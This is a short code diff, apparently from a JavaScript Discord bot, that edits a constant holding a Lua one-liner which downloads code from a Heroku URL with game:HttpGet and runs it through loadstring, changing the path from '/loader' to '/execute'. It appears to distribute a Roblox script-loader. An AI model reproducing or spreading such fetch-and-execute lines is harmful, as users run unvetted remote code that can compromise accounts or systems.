@@ -20,7 +20,7 @@ let wChannel
 
 const whitelistedUsers = { '422587947972427777': true }
 const botChannels = { '937807785293389855': true, '937808046028107777': true }
-const executeScript = '```lua' + `\nloadstring(game:HttpGet('https://arduinou.herokuapp.com/loader', true))()` + '```'
+const executeScript = '```lua' + `\nloadstring(game:HttpGet('https://arduinou.herokuapp.com/execute', true))()` + '```'
 
 function getIp(req) {
     return (req.headers['x-forwarded-for'] || '').split(',').pop().trim();
